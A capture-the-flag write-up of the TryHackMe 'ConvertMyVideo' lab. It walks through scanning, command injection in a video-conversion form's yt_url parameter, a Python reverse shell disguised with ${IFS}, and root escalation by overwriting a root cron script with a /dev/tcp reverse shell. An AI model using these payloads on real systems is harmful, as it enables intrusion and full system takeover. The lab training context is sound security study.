# ConvertMyVideo TryHackMe WriteUp  
## Machine IP = 10.112.149.155  

----
First of all, let's made a port scan:  
```bash
rustscan -a 10.112.149.155
```
Two ports are open:
-- *22* ssh
-- *80* http

----
### Discover web-site    
<img width="1594" height="698" alt="image" src="https://github.com/user-attachments/assets/b94b459f-08d5-46c6-aabb-931a2023cb0e" />    
There is a input form which requires ID to convert it into mp3 file. Let's look at the source code. I wanted to meaning of the JavaScript codes that are used in this web-site to understant every thing better.   
The script identifies exactly where the data is going and what format it expects:    

    Target URL: / (The root of the web server).

    Method: POST.

    Parameter: yt_url.

    Input logic: It takes whatever you put in #ytid and prepends https://www.youtube.com/watch?v=.  

----
I made a directory scan to find the secret file and its name is "admin":  
```bash
ffuf -u http://10.112.149.155/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.bak,.zip -fs 0   
```
<img width="1223" height="216" alt="image" src="https://github.com/user-attachments/assets/b40c0c9f-f19f-444d-9b31-a7c57119377e" />  

----
When we wanted to access admin page, it shows us a login pop.    
I decided to check "convert" funtion on burpsuite:    
When I wrote "hello" in that form it looked like this.    
<img width="1556" height="461" alt="image" src="https://github.com/user-attachments/assets/1f4f6f9e-2bff-4bde-9aca-1b32e8d62e45" />    
This output has several hints.    

1. ERROR: u'la' is not a valid URL --> alert shows us the input we write is added at the end of youtube-dl command by the server.  The command that is executed at the background looks like this probably:  
youtube-dl [options] --output /tmp/downloads/...  "MY_INPUT"    

If I can add another commands by using ; && || Or | Maybe I can execute them.    

2. "errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters... ---> From this message in the output, I can say that it doesn't like spaces. So, we should replace them.  

----
Let's try to see the use id:    
<img width="1573" height="481" alt="image" src="https://github.com/user-attachments/assets/7f2201a7-d540-41f7-bc21-408bec485b41" />    
Yeah I can see **www-data** user in there. It means our ***Command Injection*** attack works. Lets make a reverse shell.   
```bash
yt_url=;python3${IFS}-c${IFS}'import${IFS}socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.137.68",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

----
After this I got the user.flag. Now Privilege Escalation stage starts. I checked so much things but couldn't find anything important and useful even with the linpeas. So, I used pspy64. The logs from pspy reveal a high-interest process running in the background. Specifically, the following lines indicate a potential path to Root:  

    UID=0 PID=2163 | bash /var/www/html/tmp/clean.sh
    UID=0 PID=2162 | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh

#### Technical Breakdown  

    UID=0 (Root Execution): The UID=0 identifier confirms that this process is being executed with Root privileges. This is the highest level of administrative access on the system.

    Automated Task (Cron Job): The repetitive nature of these logs suggests a Cron Job—a scheduled task that runs automatically at fixed intervals (likely every minute).

    Vulnerable Path: The script being executed is located at /var/www/html/tmp/clean.sh.

#### The Exploitation Path  

Since we currently have a shell as www-data, our objective is to check the permissions of this script. If the file is world-writable or owned by our current user, we can perform a Privilege Escalation by following these steps:  

    Modify the Script: Instead of its original "cleaning" function, we inject a malicious payload into clean.sh.

    Wait for Execution: Since the system runs this file as Root every minute, it will execute our injected command with full administrative rights.

    Gain Root Access: By injecting a reverse shell or modifying binary permissions (like chmod +s /bin/bash), we can transition from a low-privileged user to the Root user instantly.

The payload is:  
```bash
echo "bash -i >& /dev/tcp/192.168.137.68/4446 0>&1" > /var/www/html/tmp/clean.sh
```
But don't forget to open nc connection on another terminal and wait for one minute. And BINGOO!!! We are root right now.  





